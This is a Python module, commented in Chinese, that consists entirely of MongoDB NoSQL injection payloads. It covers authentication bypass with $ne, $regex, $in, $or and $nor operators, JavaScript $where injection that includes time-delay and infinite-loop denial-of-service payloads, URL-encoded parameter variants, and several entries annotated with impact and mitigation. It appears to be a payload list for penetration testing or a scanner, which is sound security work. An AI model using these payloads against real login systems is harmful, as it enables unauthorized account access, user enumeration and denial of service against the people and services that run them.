"""
MongoDB身份验证绕过注入载荷
包含各种用于MongoDB身份验证绕过的注入载荷
"""

# MongoDB 单参数身份验证绕过载荷
SINGLE_PARAM_AUTH_BYPASS_PAYLOADS = [
    # 基本的空密码绕过
    {"username": {"$ne": None}},
    {"username": {"$ne": ""}},
    {"username": {"$ne": "invalid"}},
    
    # 字符串运算符
    {"username": {"$regex": ".*"}},
    {"username": {"$regex": "^admin"}},
    {"username": {"$regex": "^adm", "$options": "i"}},
    
    # 数组运算符
    {"username": {"$in": ["admin", "administrator", "root"]}},
    {"username": {"$elemMatch": {"$eq": "admin"}}},
    
    # JavaScript注入绕过
    {"username": {"$where": "this.username != null"}},
    {"username": {"$where": "return true"}},
    {"username": {"$where": "function() { return true; }"}},
    {"username": {"$where": "function() { sleep(1); return true; }"}},
    
    # 逻辑运算符
    {"username": {"$not": {"$eq": "invalid"}}},
    {"username": {"$or": [{"$eq": "admin"}, {"$ne": ""}]}},
    
    # 异常类型注入
    {"username": {"$exists": True}},
    {"username": {"$type": 2}},  # String类型
    {"username": {"$type": "string"}},
]

# MongoDB 双参数身份验证绕过载荷
DUAL_PARAM_AUTH_BYPASS_PAYLOADS = [
    # 基本的用户名密码组合绕过
    {"username": "admin", "password": {"$ne": ""}},
    {"username": {"$ne": ""}, "password": {"$ne": ""}},
    {"username": {"$in": ["admin", "administrator", "root"]}, "password": {"$ne": ""}},
    
    # 正则表达式绕过
    {"username": {"$regex": "^admin"}, "password": {"$ne": ""}},
    {"username": {"$regex": "^adm", "$options": "i"}, "password": {"$regex": ".*"}},
    
    # 嵌套文档绕过
    {"username": "admin", "password": {"$in": ["", None, "password", "123456"]}},
    {"username": {"$ne": ""}, "password": {"$in": ["", None, "password", "123456"]}},
    
    # 组合逻辑绕过
    {"$or": [{"username": "admin", "password": {"$regex": ".*"}}, {"password": {"$exists": False}}]},
    {"$or": [{"username": "admin"}, {"admin": True}], "password": {"$ne": ""}},
    
    # 使用JSON运算符绕过
    {"username": {"$eq": "admin"}, "password": {"$regex": "^pass"}},
    {"username": {"$gt": ""}, "password": {"$exists": True}},
]

# MongoDB 逻辑操作绕过载荷
LOGICAL_OPERATIONS_PAYLOADS = [
    # OR操作符绕过
    {"$or": [{"username": "admin"}, {"username": "administrator"}]},
    {"$or": [{"username": "admin"}, {"password": {"$ne": ""}}]},
    {"$or": [{"username": "admin"}, {"username": {"$regex": ".*"}}]},
    
    # AND操作符组合
    {"$and": [{"username": {"$ne": ""}}, {"password": {"$ne": ""}}]},
    {"$and": [{"username": {"$in": ["admin", "root"]}}, {"password": {"$regex": ".*"}}]},
    
    # NOR操作符
    {"$nor": [{"username": {"$eq": "invalid"}}, {"password": {"$eq": "invalid"}}]},
    {"$nor": [{"username": ""}, {"password": ""}]},
    
    # 复杂组合
    {"$or": [{"$and": [{"username": "admin"}, {"password": {"$regex": ".*"}}]}, {"isAdmin": True}]},
    {"$or": [{"admin": True}, {"$and": [{"username": {"$ne": ""}}, {"password": {"$regex": ".*"}}]}]},
]

# NoSQL命令执行载荷
NOSQL_COMMAND_EXECUTION_PAYLOADS = [
    {"username": {"$where": "sleep(5000)"}},
    {"username": {"$where": "function(){sleep(5000)}"}},
    {"username": {"$where": "function(){return sleep(5000)}"}},
    {"username": {"$function": {"body": "return sleep(5000)"}}},
    {"username": {"$where": "function(){while(1){}}"}},  # 死循环，谨慎使用
    {"username": {"$where": "function(){var d = new Date(); while(new Date()-d<5000){}}; return true;"}},
]

# 安全的HTTP参数格式载荷 (URL-encoded)
URL_ENCODED_PAYLOADS = [
    "username[$ne]=invalid",
    "username[$regex]=.*",
    "username[$in][]=admin&username[$in][]=administrator",
    "username[$exists]=true",
    "username=admin&password[$ne]=",
    "$or[0][username]=admin&$or[1][username][$regex]=.*",
    "$or[0][username]=admin&$or[1][password][$ne]=",
    "username[$ne]=invalid&password[$ne]=invalid",
]

# 详细测试载荷
DETAILED_PAYLOAD_OBJECTS = [
    {
        "name": "管理员空密码绕过",
        "payload": {"username": "admin", "password": {"$ne": ""}},
        "description": "尝试使用空密码绕过admin用户登录",
        "impact": "认证绕过",
        "mitigation": "验证所有输入，禁用$ne等运算符"
    },
    {
        "name": "正则表达式枚举用户",
        "payload": {"username": {"$regex": "^a"}, "password": {"$ne": ""}},
        "description": "使用正则表达式枚举以'a'开头的用户",
        "impact": "用户信息泄露",
        "mitigation": "禁用$regex操作符或进行查询白名单过滤"
    },
    {
        "name": "延时操作检测注入点",
        "payload": {"username": {"$where": "function(){var d = new Date(); while(new Date()-d<3000){}}; return true;"}},
        "description": "执行一个延时操作来检测盲注可能性",
        "impact": "服务器资源消耗",
        "mitigation": "禁用$where操作符或JavaScript执行"
    },
    {
        "name": "布尔注入测试",
        "payload": {"$where": "this.username == 'admin' && this.password.length > 5"},
        "description": "使用布尔逻辑测试密码长度",
        "impact": "信息泄露",
        "mitigation": "使用参数化查询并禁用$where操作符"
    }
] 